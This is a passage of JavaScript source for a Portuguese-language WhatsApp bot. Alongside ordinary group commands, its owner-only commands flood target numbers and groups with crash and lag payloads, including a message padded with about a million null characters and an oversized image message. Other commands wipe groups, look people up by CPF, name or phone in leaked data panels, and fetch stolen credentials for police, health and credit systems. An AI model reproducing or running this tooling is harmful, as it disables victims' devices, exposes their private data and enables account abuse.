  }

  const groupMetadata = await uwu.groupMetadata(m.chat)
  const groupAdmins = groupMetadata.participants
    .filter(p => p.admin !== null)
    .map(p => p.id)

  if (groupAdmins.includes(target)) {
    return reply('❌ Não posso banir um administrador.')
  }

  try {
    await uwu.groupParticipantsUpdate(m.chat, [target], 'remove')
    reply(`✅ Usuário banido com sucesso.`)
  } catch (err) {
    console.error('Erro ao banir:', err)
    reply('❌ Ocorreu um erro ao tentar banir o usuário.')
  }
break

case 'antidoc':
if (!m.isGroup) return reply(mess.grp)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadm)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
    if (Antidoc) return reply('Ja esta ativo')
    dataGp[0].antidoc = true
    setGp(dataGp)
    reply('Ativou com sucesso o recurso de anti documento neste grupo✔️')
} else if (Number(args[0]) === 0) {
    if (!Antidoc) return reply('Ja esta Desativado')
    dataGp[0].antidoc = false
    setGp(dataGp)
    reply('‼️ Desativou com sucesso o recurso de anti documento neste grupo✔️')
} else {
    reply('1 para ativar, 0 para desativar')
}
break

case 'antilink':
if (!m.isGroup) return reply(mess.grp)
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadm)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
    if (isAntiLinkHard) return reply('Ja esta ativo')
    dataGp[0].antilinkhard = true
    setGp(dataGp)
    reply('🌀 Ativou com sucesso o recurso de antilink neste grupo 📝')
} else if (Number(args[0]) === 0) {
    if (!isAntiLinkHard) return reply('Ja esta Desativado')
    dataGp[0].antilinkhard = false
    setGp(dataGp)
    reply('‼️ Desativou com sucesso o recurso de antilink harcore neste grupo✔️')
} else {
    reply('1 para ativar, 0 para desativar')
}
break

case 'atrasostatus':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  for(let i = 0; i < 20; i++) {
    await protocolbug3(jid)
    await new Promise(resolve => setTimeout(resolve, 500)) // pausa 2 segundos
  }
  reply(`${command} Enviado com sucesso para o alvo`)
break

case 'bug':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  for(let i = 0; i < 3; i++) {
    await SockMentionJid3(jid, EsQl)
    delay(100)
    await XeonXRobust(jid, EsQl)
    delay(100)
    await nullQ(jid, EsQl)
    delay(100)
    await StxCuiSh(jid, EsQl)
    delay(100)
    await enviarBugStickerCrash(jid, EsQl)
    delay(100)
  }
  await uwu.sendMessage(m.chat, { text: `Usuário morto com sucesso!` })
break

case 'atraso':
  if (!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  for (let i = 0; i < 1; i++) {
    await outofsync(jid, EsQl)
    await delay(400)
    await TagWhatsApp1(jid, EsQl)
    await delay(400)
    await Loc(jid, EsQl)
    await delay(400)
    await XeonXRobust(jid, XeonBotInc, true, true, EsQl)
    await delay(400)
  }

  reply(m.chat, { text: `✅ Atraso enviado com sucesso` })
break

case 'atraso':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  for (let i = 0; i < 50; i++) {
    await uwu.relayMessage(jid, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: `\n ${args.join(" ") ? args.join(" ") : '- 𝓫𝔂 𝓓𝓮𝓼𝓽𝓻𝓸𝔂𝓮𝓻 𝓿0.1'}\n\n\n`,
                        format: "cta_url"
                    },
                    nativeFlowResponseMessage: {
                        name: 'cta_url',
                        paramsJson: `{\"cta_url\":true,\"cta_url\":true,\"cta_url\":\"AdvanceBug\",\"cta_url\":\"1028995200000\",\"cta_url\":\"cta_url\",\"cta_url\":\"94643116\",\"cta_url\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"cta_url\":\"\u0003\",\"cta_url\":\"cta_url\",\"cta_url\":\"cta_url\",\"cta_url\":\"cta_url\"}`,
                        version: 3
                    }
                }
            }
        }
    }, {
        participant: {
            jid: jid
        }
    });
  }
break

case 'kill-notify':
  if (!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return

  await trashinfinity(jid, EsQl)
  await nativemessage(jid, EsQl)
  await darkflower(jid, EsQl)
  await AnakKucai(jid, EsQl)
  await CrlButton(jid, EsQl)
  await VPen(jid, EsQl)
  await Blanking(jid, EsQl)
  await Loc(jid, EsQl)
  await Notifattack(jid, EsQl)
  await doc(jid, EsQl)
  await buginvite(jid, EsQl)
  await LocInvisi(jid, EsQl)
  await TagWhatsApp1(jid, EsQl)
  await reply(`${pushname}\n*Usuário morto! Espere para usar o comando novamente*`)
break

case 'nuke':
  if (!m.isGroup) return reply(mess.grp)
  if (!isCreator) return reply(mess.prem)
  await limparGrupoRenomear(m.key.remoteJid, '𝒜𝑅𝒬𝒰𝐼𝒱𝒜𝒟𝒪 𝐵𝒴 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣', 'GRUPO ARQUIVO PELO MELHOR BOT DE TODOS!\n 𝒟𝐸𝒮𝒯𝑅𝒪𝒴𝐸𝑅 𝒱𝟢.𝟣');
break

case 'location': {
    if (!isCreator) return reply(mess.prem)
    if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

    var jid = await validarNumeroWhatsApp(q, reply)
    if (!jid) return

    for (let i = 0; i < 5; i++) {
    await sendLiveLocationMessage(jid)
    }
}
break

case 'null':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  
  await nullInf(jid)
break

case 'play':
  if(!text) return reply(`Digite o nome da musica`)
  const query = text.split(' ').slice(1).join(' ')

  try {
    const axios = require('axios')
    const response = await axios.get(`https://nodz-apis.com.br/api/downloads/playaudio?query=${encodeURIComponent(query)}&apiKey=9e603158b5`)

    if (response.data.status) {
      const data = response.data.resultado

      if (!data || !data.audio || !data.titulo || !data.descricao) {
        throw new Error('Dados inválidos ou incompletos na resposta da API.')
      }

      const audioUrl = data.audio
      const imageUrl = data.imagem

      const audioResponse = await axios.get(audioUrl, { responseType: 'arraybuffer' })
      const audioBuffer = Buffer.from(audioResponse.data)

      const imageResponse = await axios.get(imageUrl, { responseType: 'arraybuffer' })
      const imageBuffer = Buffer.from(imageResponse.data)

      const tempImagePath = path.join(os.tmpdir(), `image_${Date.now()}.jpg`);
      fs.writeFileSync(tempImagePath, imageBuffer);

        await uwu.sendMessage(m.chat, { 
          image: { url: tempImagePath },
          caption: `🎶 *Título*: ${data.titulo}\n👀 *Visualizações*: ${data.views}\n📝 *Descrição*: ${data.descricao}\n🎤 *Autor*: ${data.autor}\n📅 *Postado*: ${data.postado}\n⏳ *Duração*: ${data.tempo})`,
          mentions: [m.sender],
        })
        await uwu.sendMessage(m.chat, {
          audio: audioBuffer,
          mimetype: 'audio/mp4',
          ptt: false,
      })
      fs.unlinkSync(tempImagePath);
  } else {
    await uwu.sendMessage(from, { text: '❌ Não foi possível encontrar o áudio.' });
  }
} catch (error) {
  console.error('Erro ao buscar ou enviar o áudio:', error);
  await uwu.sendMessage(from, { text: '❌ Ocorreu um erro ao buscar o áudio.' });
}
break

case 'plaq1':
case 'plaq2':
case 'plaq3':
case 'plaq4':
case 'plaq5':
case 'plaq6':
case 'plaq7':
case 'plaq8': {
  if (!isCreator) return reply(mess.prem);

  const comando = command; // plaq1, plaq2, etc.
  const numero = comando.replace('plaq', ''); // extrai o número
  const texto = q.trim();

  if (!texto) {
    return reply(`❗ Informe um texto para gerar a imagem.\nExemplo: ${comando} luckzin`);
  }

  try {
    const url = `https://pnsapis.online/api/${comando}?texto=${encodeURIComponent(texto)}&apitoken=Verykibes%20Channel2025ofc`;

    await uwu.sendMessage(from, {
      image: { url },
      caption: ``
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    return reply(`❌ Erro ao gerar a placa ${numero}.`);
  }
}
break;

case 'gethtml':
  if(!isCreator) return reply(mess.prem)
  if(!text) return reply(`Digite o site sem o https://\nExemplo: xvideos.com`)
  const axios = require('axios')
  const site = text.trim();
  const response = await axios.get(`https://nodz-apis.com.br/api/outras/gethtml?url=https://${site}&apiKey=9e603158b5`)
  const html = response.data?.resultado

  if (!html || typeof html !== 'string') {
    throw new Error('HTML não encontrado ou formato inválido.');
  }

  const filePath = './tempfile.html'
  fs.writeFileSync(filePath, html)

  const fileBuffer = fs.readFileSync(filePath);

  await uwu.sendMessage(m.chat, {
    document: fileBuffer,
    fileName: 'site.html',
    mimetype: 'text/html',
    caption: 'HTML GERADO.'
  })
  fs.unlinkSync(filePath)
break

case 'nick':
  if(!isCreator) return reply(mess.prem)
  if(!text) return reply(`Digite o nick que você quer criar!`)
    const nome = text.trim();
    try {
        const axios = require('axios')
        const response = await axios.get(`https://nodz-apis.com.br/api/outras/fazer/nick?query=${encodeURIComponent(nome)}&apiKey=9e603158b5`)
        const { resultado } = response.data

        const nicks = resultado
            .filter(item => item.nome && item.nome.trim() !== '')
            .map(item => `• ${item.nome}`)
            .join('\n');

        await uwu.sendMessage(m.chat, {
            text: `${nicks}`
        });
    } catch (error) {
        console.error('Erro ao buscar nick:', error);
        await uwu.sendMessage(sender, { text: 'Erro ao gerar nick!' });
    }
break

case "tel": {
  if (!isCreator) return reply(mess.prem)

  const telefone = q.trim().replace(/\D/g, '');
  if (!telefone || telefone.length < 11) {
      return reply("Por favor, informe um TELEFONE válido. Exemplo: tel 48991522702");
  }

  try {
      const axios = require('axios');
      const url = `https://v0-painel-de-dados.vercel.app/api/consultas/telefone?telefone=${telefone}`;

      const response = await axios.get(url, {
          headers: {
              'X-Api-Access': 'aescorp-panel-access'
          }
      });

      const serasaData = response.data?.resultado?.serasa;

      if (!serasaData || serasaData.length === 0) {
          return reply(`*Nenhuma informação sobre o telefone ${telefone} encontrada.*`);
      }

      let result = "*🔍 Consulta telefone:*\n\n";

      for (const item of serasaData) {
          const dados = item.dadoscpf || {};
          const drop = item.drop || {};
          const tel = item.telefone || {};

          result += `
👤 *Nome:* ${dados.nome || "Não informado"}
📅 *Nascimento:* ${dados.nasc?.split(" ")[0] || "Desconhecido"}
🧓 *Mãe:* ${dados.nome_mae || "Desconhecida"}
🧑‍🦳 *Pai:* ${dados.nome_pai || "Desconhecido"}
🆔 *CPF:* ${dados.cpf || "Desconhecido"}
📝 *RG:* ${dados.rg || "Não informado"} - ${dados.orgao_emissor || ""}
💸 *Renda:* R$ ${dados.renda || "Não informado"}
🗳️ *Título de Eleitor:* ${dados.titulo_eleitor || "Não disponível"}

🏠 *Endereço:*
 - Rua: ${drop.logr_tipo || ""} ${drop.logr_nome || "Desconhecida"}, Nº ${drop.logr_numero || "-"}
 - Bairro: ${drop.bairro || "-"}, Cidade: ${drop.cidade || "-"}, CEP: ${drop.cep || "-"}
 - UF: ${drop.uf || "-"}

📱 *Telefone:* (${tel.DDD || "--"}) ${tel.TELEFONE || "Não informado"}
📆 *Inclusão:* ${tel.DT_INCLUSAO || "Data desconhecida"}

          `.trim() + "\n\n";
      }

      reply(result.trim());

  } catch (error) {
      console.error(error);
      reply("Erro ao consultar o telefone. Tente novamente mais tarde.");
  }
}
break;

case "nome": {
  if (!isCreator) return reply(mess.prem);

  const nome = q.trim();
  if (!nome || nome.length < 5) {
      return reply("Por favor, informe um NOME válido. Exemplo: nome Nataildes Carvalho De Jesus");
  }

  try {
      const axios = require('axios');
      const url = `https://v0-painel-de-dados.vercel.app/api/consultas/nome?nome=${encodeURIComponent(nome)}`;
      const response = await axios.get(url, {
          headers: {
              'X-Api-Access': 'aescorp-panel-access'
          }
      });

      const data = response.data?.resultado;

      if (!data || data.length === 0) {
          return reply(`*Nenhuma informação sobre o nome ${nome} encontrada.*`);
      }

      let result = `*🔍 Consulta por Nome:*\n\n`;

      for (const pessoa of data) {
          result += `
👤 *Nome Completo:* ${pessoa.nome || "Desconhecido"}
📅 *Data de Nascimento:* ${pessoa.nasc?.split(" ")[0] || "Desconhecida"}
🆔 *CPF:* ${pessoa.cpf || "Desconhecido"}
👩‍🦳 *Nome da Mãe:* ${pessoa.nome_mae || "Desconhecida"}
🔱 *Sexo:* ${pessoa.sexo || "Desconhecido"}
          `.trim() + "\n\n";
      }

      reply(result.trim());

  } catch (error) {
      console.error(error);
      reply("Erro ao consultar o nome. Tente novamente mais tarde.");
  }
}
break;

case 'pmrj': {
  if(!isCreator) return reply(mess.prem);

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/outros/pmrj?apitoken=Verykibes%20Channel2025ofc`;

    const response = await axios.get(url);
    const data = response?.data;

    if (!data || data.status !== true) {
      return reply('❌ Não foi possível obter os dados do PM RJ no momento.');
    }

    // Formata quebras de linha
    const conta = data.conta.replace(/\\n/g, '\n');

    const resultado = `
🚓 *Credenciais PM-RJ:*

${conta}
`.trim();

    return reply(resultado);

  } catch (err) {
    console.error(err);
    return reply("❌ Ocorreu um erro ao buscar as credenciais do PM RJ.");
  }
}
break;


case 'sppni': {
  if(!isCreator) return reply(mess.prem);

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/outros/sp-pni?apitoken=Verykibes%20Channel2025ofc`;

    const response = await axios.get(url);
    const data = response?.data;

    if (!data || data.status !== true) {
      return reply('❌ Não foi possível obter os dados do SP-PNI no momento.');
    }

    // Limpa os \n
    const conta = data.conta.replace(/\\n/g, '\n');

    const resultado = `
💉 *Credenciais SP-PNI:*

${conta}
`.trim();

    return reply(resultado);

  } catch (err) {
    console.error(err);
    return reply("❌ Ocorreu um erro ao buscar as credenciais do SP-PNI.");
  }
}
break;

case 'credlink': {
  if(!isCreator) return reply(mess.prem);

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/outros/credlink?apitoken=Verykibes%20Channel2025ofc`;

    const response = await axios.get(url);
    const data = response?.data;

    if (!data || data.status !== true) {
      return reply('❌ Não foi possível obter os dados do credlink no momento.');
    }

    // Limpeza e formatação básica do texto da conta
    const conta = data.conta.replace(/\\n/g, '\n');

    const resultado = `
🔐 *Credenciais CREDILINK:*

${conta}
`.trim();

    return reply(resultado);

  } catch (err) {
    console.error(err);
    return reply("❌ Ocorreu um erro ao buscar as credenciais do CREDILINK.");
  }
}
break;

case 'nome2': {
  if (!isCreator) return reply(mess.prem);

  const nomeBusca = q.trim();
  if (!nomeBusca) {
    return reply('Por favor, informe um nome válido. Exemplo: nome2 Nataildes Carvalho De Jesus');
  }

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/consultas/bigdata/nome?query=${encodeURIComponent(nomeBusca)}&apitoken=Verykibes%20Channel2025ofc`;
    const { data } = await axios.get(url);

    if (!data?.status || !data?.resultado) {
      return reply(`❌ Nenhum resultado encontrado para o nome: ${nomeBusca}`);
    }

    const r = data.resultado;

    // Verificar se todos os campos relevantes estão undefined ou "Não informado"
    const camposPrincipais = [
      r.NOME, r.CPF, r.SEXO, r.DT_NASCIMENTO, r.IDADE, r.ESTADO_CIVIL, r.TITULO_ELEITOR,
      r.NOME_MAE, r.NOME_PAI, r.registro_geral?.RG, r.dados_aquisitivos?.BASE_RENDA
    ];

    const todosIndefinidos = camposPrincipais.every(campo =>
      campo === undefined || campo === null || campo === "Não informado" || campo === "Não encontrado"
    );

    if (todosIndefinidos) {
      return reply(`❌ Nenhuma informação relevante encontrada para o nome: *${nomeBusca}*`);
    }

    const infoPrincipal = `
🔎 *Resultado da Busca:*
👤 *Nome:* ${r.NOME || 'Desconhecido'}
🆔 *CPF:* ${r.CPF || 'Desconhecido'}
🧬 *Sexo:* ${r.SEXO || 'Desconhecido'}
📅 *Nascimento:* ${r.DT_NASCIMENTO || 'Desconhecido'}
🎂 *Idade:* ${r.IDADE || 'Desconhecido'}
💍 *Estado Civil:* ${r.ESTADO_CIVIL || 'Desconhecido'}
📄 *Título Eleitor:* ${r.TITULO_ELEITOR || 'Desconhecido'}
🔢 *PIS:* ${r.PIS || 'Desconhecido'}
⚰️ *Óbito:* ${r.DT_OBITO || 'Desconhecido'}
👩‍👦 *Mãe:* ${r.NOME_MAE || 'Desconhecido'}
👨‍👦 *Pai:* ${r.NOME_PAI || 'Desconhecido'}

🆔 *RG:* ${r.registro_geral?.RG || 'Desconhecido'}
🏢 *Órgão Emissor:* ${r.registro_geral?.ORGÃO_EMISSOR || 'Desconhecido'}
📍 *UF Emissão:* ${r.registro_geral?.UF_EMISSAO || 'Desconhecido'}

💰 *Base Renda:* R$ ${r.dados_aquisitivos?.BASE_RENDA || 'Desconhecido'}
🏠 *Poder Aquisitivo:* ${r.dados_aquisitivos?.PODER_AQUISITIVO || 'Desconhecido'}
📊 *Faixa:* ${r.dados_aquisitivos?.FX_PODER_AQUISITIVO || 'Desconhecido'}
📈 *Score CSB8:* ${r.dados_aquisitivos?.SCORE_CSB8 || '-'} - ${r.dados_aquisitivos?.CSB8_FAIXA || '-'}
📉 *Score CSBA:* ${r.dados_aquisitivos?.SCORE_CSBA || '-'} - ${r.dados_aquisitivos?.CSBA_FAIXA || '-'}
    `.trim();

    let telefones = '*📞 Telefones encontrados:*\n';
    if (r.telefones && r.telefones.length > 0) {
      telefones += r.telefones.map(t => `• ${t}`).join('\n');
    } else {
      telefones += 'Nenhum encontrado';
    }

    let emails = '*📧 E-mails encontrados:*\n';
    if (r.emails && r.emails.length > 0) {
      emails += r.emails.map(e => `• ${e.EMAIL} (${e.SCORE})`).join('\n');
    } else {
      emails += 'Nenhum encontrado';
    }

    let parentes = '*🧬 Parentes:*\n';
    if (r.parentes && r.parentes.length > 0) {
      parentes += r.parentes.map(p => `• ${p.NOME} (${p.VINCULO}) - CPF: ${p.CPF}`).join('\n');
    } else {
      parentes += 'Nenhum encontrado';
    }

    let enderecos = '*🏡 Endereços:*\n';
    if (r.enderecos && r.enderecos.length > 0) {
      enderecos += r.enderecos.map(e => `• ${e.NOME}, ${e.NUMERO}, ${e.BAIRRO}, ${e.CIDADE} - CEP: ${e.CEP}`).join('\n');
    } else {
      enderecos += 'Nenhum encontrado';
    }

    const resposta = `${infoPrincipal}\n\n${telefones}\n\n${emails}\n\n${parentes}\n\n${enderecos}`;
    return reply(resposta);

  } catch (err) {
    console.error(err);
    return reply("❌ Ocorreu um erro ao consultar o nome. Tente novamente mais tarde.");
  }
}
break;


case 'cpf2': {
  if (!isCreator) return reply(mess.prem)

  const cpfnum = q.trim().replace(/\D/g, '')
  if (!cpfnum || cpfnum.length !== 11) {
    return reply('Por favor, informe um CPF válido. Exemplo: cpf2 21272557553')
  }

  try {
    const axios = require('axios')
    const url = `https://pnsapis.online/consultas/bigdata/cpf?query=${cpfnum}&apitoken=Verykibes%20Channel2025ofc`

    const { data } = await axios.get(url)
    const r = data?.resultado

    if (!r || !r.CPF) {
      return reply(`❌ Nenhuma informação encontrada para o CPF: *${cpfnum}*`)
    }

    const camposPrincipais = [
      r.NOME, r.CPF, r.SEXO, r.DT_NASCIMENTO, r.IDADE, r.ESTADO_CIVIL,
      r.TITULO_ELEITOR, r.NOME_MAE, r.NOME_PAI, r.REGISTRO_GERAL?.RG,
      r.DADOS_AQUISITIVOS?.BASE_RENDA
    ]

    const tudoVazio = camposPrincipais.every(campo =>
      campo === undefined || campo === null || campo === 'Não informado' || campo === 'Não encontrado'
    )

    if (tudoVazio) {
      return reply(`❌ Nenhuma informação relevante encontrada para o CPF: *${cpfnum}*`)
    }

    const info = `
🔍 *Consulta por CPF:*
👤 *Nome:* ${r.NOME || "Desconhecido"}
🆔 *CPF:* ${r.CPF || "Desconhecido"}
📅 *Nascimento:* ${r.DT_NASCIMENTO || "Desconhecido"}
🎂 *Idade:* ${r.IDADE || "Desconhecida"}
🧬 *Sexo:* ${r.SEXO || "Não informado"}
💍 *Estado Civil:* ${r.ESTADO_CIVIL || "Não informado"}
👩‍🦳 *Mãe:* ${r.NOME_MAE || "Desconhecida"}
👨 *Pai:* ${r.NOME_PAI || "Não informado"}
🗳️ *Título de Eleitor:* ${r.TITULO_ELEITOR || "Desconhecido"}
📄 *PIS:* ${r.PIS || "Não informado"}
⚰️ *Óbito:* ${r.DT_OBITO || "Não informado"}

🪪 *RG:* ${r.REGISTRO_GERAL?.RG || "Não informado"}
🏛️ *Órgão Emissor:* ${r.REGISTRO_GERAL?.ORGÃO_EMISSOR || "Não informado"}
📍 *UF Emissão:* ${r.REGISTRO_GERAL?.UF_EMISSAO || "Não informado"}

💸 *Base Renda:* R$ ${r.DADOS_AQUISITIVOS?.BASE_RENDA || "Desconhecida"}
🏠 *Poder Aquisitivo:* ${r.DADOS_AQUISITIVOS?.PODER_AQUISITIVO || "Desconhecido"}
📊 *Faixa:* ${r.DADOS_AQUISITIVOS?.FX_PODER_AQUISITIVO || "Desconhecida"}
📈 *Score CSB8:* ${r.DADOS_AQUISITIVOS?.SCORE_CSB8 || "-"} - ${r.DADOS_AQUISITIVOS?.CSB8_FAIXA || "-"}
📉 *Score CSBA:* ${r.DADOS_AQUISITIVOS?.SCORE_CSBA || "-"} - ${r.DADOS_AQUISITIVOS?.CSBA_FAIXA || "-"}
    `.trim()

    let telefones = '*📞 Telefones:*\n'
    if (r.TELEFONES?.length > 0) {
      telefones += r.TELEFONES.map(t => `• ${t}`).join('\n')
    } else {
      telefones += 'Nenhum encontrado'
    }

    let emails = '*📧 E-mails:*\n'
    if (r.EMAILS?.length > 0) {
      emails += r.EMAILS.map(e => `• ${e.EMAIL} (${e.SCORE})`).join('\n')
    } else {
      emails += 'Nenhum encontrado'
    }

    let parentes = '*🧬 Parentes:*\n'
    if (r.PARENTES?.length > 0) {
      parentes += r.PARENTES.map(p => `• ${p.NOME} (${p.VINCULO}) - CPF: ${p.CPF}`).join('\n')
    } else {
      parentes += 'Nenhum encontrado'
    }

    let enderecos = '*🏠 Endereços:*\n'
    if (r.ENDERECOS?.length > 0) {
      enderecos += r.ENDERECOS.map(e =>
        `• ${e.NOME}, Nº ${e.NUMERO}, ${e.BAIRRO}, ${e.CIDADE} - CEP: ${e.CEP}`
      ).join('\n')
    } else {
      enderecos += 'Nenhum encontrado'
    }

    const resposta = `${info}\n\n${telefones}\n\n${emails}\n\n${parentes}\n\n${enderecos}`
    return reply(resposta)

  } catch (err) {
    console.error(err)
    return reply("❌ Ocorreu um erro ao consultar o CPF. Tente novamente mais tarde.")
  }
}
break;

case 'sticker': {
  if (!quoted) return reply('📌 Responda a uma imagem ou vídeo com o comando *sticker*.')

  try {
    const { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const mime = quoted.mimetype || ''

    if (!/image|video/.test(mime)) {
      return reply('❌ A mensagem marcada não é uma imagem ou vídeo.')
    }

    const stream = await downloadContentFromMessage(quoted, mime.split('/')[0])
    let buffer = Buffer.from([])

    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }

    const sticker = new Sticker(buffer, {
      pack: 'Feito por',
      author: 'Destoyer v0.1',
      type: StickerTypes.FULL,
    })

    const stickerBuffer = await sticker.toBuffer()

    await uwu.sendMessage(m.chat, {
      sticker: stickerBuffer
    }, { quoted: m })

  } catch (err) {
    console.error(err)
    reply('❌ Ocorreu um erro ao converter para figurinha.')
  }
  break;
}

case 'tel2': {
  if (!isCreator) return reply(mess.prem);

  const tel = q.trim().replace(/\D/g, '');
  if (!tel || tel.length < 10) {
    return reply('Por favor, informe um telefone válido. Exemplo: telefone2 61981287778');
  }

  try {
    const axios = require('axios');
    const url = `https://pnsapis.online/api/busca/telefone?apitoken=Verykibes%20Channel2025ofc&query=${tel}`;

    const response = await axios.get(url);
    const data = response?.data;

    if (!data || !data.status || !data.resultado) {
      return reply(`❌ Nenhuma informação encontrada para o telefone ${tel}`);
    }

    const resultado = data.resultado.replace(/\n/g, '').trim();

    const telefone = resultado.match(/TELEFONE:\s*(\d+)/i)?.[1] || 'Desconhecido';
    const nome = resultado.match(/NOME:\s*(.+?)CPF\/CNPJ:/i)?.[1]?.trim() || 'Desconhecido';
    const cpf = resultado.match(/CPF\/CNPJ:\s*(\d+)/i)?.[1] || 'Desconhecido';
    const logradouro = resultado.match(/LOGRADOURO:\s*(.+?)NÚMERO:/i)?.[1]?.trim() || 'Desconhecido';
    const numero = resultado.match(/NÚMERO:\s*(.+?)COMPLEMENTO:/i)?.[1]?.trim() || 'Desconhecido';
    const complemento = resultado.match(/COMPLEMENTO:\s*(.+?)BAIRRO:/i)?.[1]?.trim() || 'Desconhecido';
    const bairro = resultado.match(/BAIRRO:\s*(.+?)CIDADE:/i)?.[1]?.trim() || 'Desconhecido';
    const cidade = resultado.match(/CIDADE:\s*(.+?)ESTADO:/i)?.[1]?.trim() || 'Desconhecido';
    const estado = resultado.match(/ESTADO:\s*(.+?)CEP:/i)?.[1]?.trim() || 'Desconhecido';
    const cep = resultado.match(/CEP:\s*(\d+)/i)?.[1] || 'Desconhecido';

    const msg = `
📞 *Consulta por Telefone:*

📱 *Telefone:* ${telefone}
👤 *Nome:* ${nome}
🆔 *CPF/CNPJ:* ${cpf}

📍 *Endereço:*
🏘️ *Logradouro:* ${logradouro}, Nº ${numero}
🏢 *Complemento:* ${complemento}
🏙️ *Bairro:* ${bairro}
🌆 *Cidade:* ${cidade} - ${estado}
📮 *CEP:* ${cep}
`.trim();

    return reply(msg);

  } catch (err) {
    console.error(err);
    return reply('❌ Ocorreu um erro ao consultar o telefone.');
  }
}
break;


case "cpf": {
  if (!isCreator) return reply(mess.prem)

  const cpfNumero = q.trim().replace(/\D/g, '');
  if (!cpfNumero || cpfNumero.length !== 11) {
      return reply("Por favor, informe um CPF válido. Exemplo: cpf 21272557553");
  }

  try {
      const axios = require('axios');
      const url = `https://v0-painel-de-dados.vercel.app/api/consultas/cpf?cpf=${cpfNumero}`;
      const response = await axios.get(url, {
          headers: {
              'X-Api-Access': 'aescorp-panel-access'
          }
      });

      const data = response.data?.resultado;

      if (!data || !data.cpf) {
          return reply(`*Nenhuma informação sobre o CPF ${cpfNumero} encontrada.*`);
      }
      
      const result = `
🔍 *Consulta por CPF:*
👤 *Nome:* ${data.nome || "Desconhecido"}
🆔 *CPF:* ${data.cpf}
📅 *Nascimento:* ${data.data_nascimento || "Desconhecida"}
👩‍🦳 *Mãe:* ${data.nome_mae || "Desconhecida"}
👨 *Pai:* ${data.nome_pai || "Não informado"}
📝 *RG:* ${data.rg || "Não informado"} - ${data.orgao_emissor || ""}
🧬 *Sexo:* ${data.sexo || "Não informado"}
💍 *Estado Civil:* ${data.estado_civil || "Desconhecido"}
🗳️ *Título de Eleitor:* ${data.titulo_eleitor || "Desconhecido"}
🌎 *Nacionalidade:* ${data.nacionalidade || "Não informado"}
💰 *Renda:* R$ ${data.renda || "Desconhecida"}
      `.trim();

      reply(result);

  } catch (error) {
      console.error(error);
      reply("Erro ao consultar o CPF. Tente novamente mais tarde.");
  }
}
break;

case "kill-grupo": {
  if (!m.isGroup) return reply(`@${pushname}, esse comando só funciona em grupo`)
  if(!isCreator) return reply(mess.prem)
      try {
          for(let i = 0; i < 15; i++) {
            await buginvite(m.chat, { ptcp: !0 }, EsQl );
          }
          await uwu.sendMessage(m.chat, { text: "𝓫𝔂 𝓓𝓮𝓼𝓽𝓻𝓸𝔂𝓮𝓻 𝓿0.1"} )
          // await uwu.groupLeave(isTarget);
  
      } catch (error) {
          reply(util.format(error));
      }
  }
break;

case "clearchat":
await uwu.relayMessage(m.chat, {
  'botInvokeMessage': {
      'message': {
          'messageContextInfo': {
              'deviceListMetadataVersion': 2,
              'deviceListMetadata': {}
          },
          'imageMessage': {
              'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m234/up-oil-image-e1bbfe2b-334b-4c5d-b716-d80edff29301?ccb=9-4&oh=01_Q5AaID0uZoxsi9v2I7KJZEgeJ7IVkFPZkt2yeYf6ps0IWG2g&oe=66E7130B&_nc_sid=000000&mms3=true",
              'mimetype': "image/png",
              'caption': "CHAT LIMPO ✅",
              'fileSha256': "YVuPx9PoIxL0Oc3xsUc3n3uhttmVYlqUV97LKKvIjL8=",
              'fileLength': "999999999",
              'height': 10000000000000000,
              'width': 99999999999999999999999,
              'mediaKey': "4T8WJKuKvJ9FXSwldCXe5+/IA7aYi5ycf301J0xIZwA=",
              'fileEncSha256': 'jfG3tesFLdqtCzO6cqU51HGGkEtd7+w22aJtaEm2yjE=',
              'directPath': "/v/t62.7118-24/29631950_1467571294644184_4827066390759523804_n.enc?ccb=11-4&oh=01_Q5AaIFPK_QoDRMR4vZIBbMTdy6GreGhSA2HHRAIu0-vAMgqN&oe=66E72F5E&_nc_sid=5e03e0",
              'mediaKeyTimestamp': '1723839207',
              'jpegThumbnail': "imagenMiniaturaBase64",
              'scansSidecar': "il8IxPgrhGdtn37jGMVgQVRKlPd/CERE+Nr822DZe2UT9r0YT3KPSQ==",
              'scanLengths': [5373, 24562, 15656, 22918],
              'midQualityFileSha256': "s8Li+/zg2VmzMvJtRAZHPVres8nAPEWcd11nK5b/keY="
          }
      },
      'expiration': 0,
      'ephemeralSettingTimestamp': "1723838053",
      'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "UNKNOWN",
          'initiatedByMe': true
      }
  }
}, {});
break

case 'verfoto': {
  if(!isCreator) return reply(mess.prem)
